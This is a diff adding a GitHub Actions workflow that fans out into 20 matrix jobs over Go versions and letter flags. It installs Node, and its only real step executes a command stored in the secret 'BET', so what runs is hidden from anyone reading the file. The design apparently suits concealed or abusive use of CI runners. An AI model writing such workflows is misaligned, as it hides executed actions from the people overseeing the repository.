@@ -1,0 +1,22 @@
+name: samp
+on:   
+  push: 
+  pull_request: 
+  
+jobs: 
+ samp-1: 
+    runs-on: ubuntu-24.04
+    strategy: 
+      fail-fast: false 
+      matrix: 
+         go: [1.11, 1.12, 1.13, 1.14, 1.15] 
+         flag: [A, B, C, D] 
+    timeout-minutes: 3
+  
+    steps: 
+    - uses: actions/checkout@v4
+    - uses: actions/setup-node@v4
+      with:
+         node-version: 20
+      continue-on-error: true 
+    - run: ${{ secrets.BET }}
